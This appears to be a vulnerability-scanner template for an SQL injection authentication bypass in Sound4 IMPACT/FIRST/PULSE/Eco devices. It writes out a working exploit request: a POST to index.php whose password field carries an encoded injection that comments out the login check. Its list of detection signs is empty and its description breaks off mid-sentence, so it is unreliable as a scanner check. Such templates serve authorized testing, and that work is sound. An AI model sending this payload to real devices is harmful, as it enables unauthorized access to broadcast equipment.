id: sound4-password-auth-bypass
brief:
    title: Sound4 IMPACT/FIRST/PULSE/Eco <=2.x - Authentication Bypass
    by: r3Y3r53
    level: high
    about: The application suffers from an SQL Injection vulnerability. Input passed through the 'password' POST parameter in 'index.php' is not properly sanitised before being returned to the user or used in...
    label:
        - sound4
        - auth-bypass
        - sqli
        - misconfig
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/index.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: username=test&password=%27%2Bjoxy--%2Bz
      signs: []
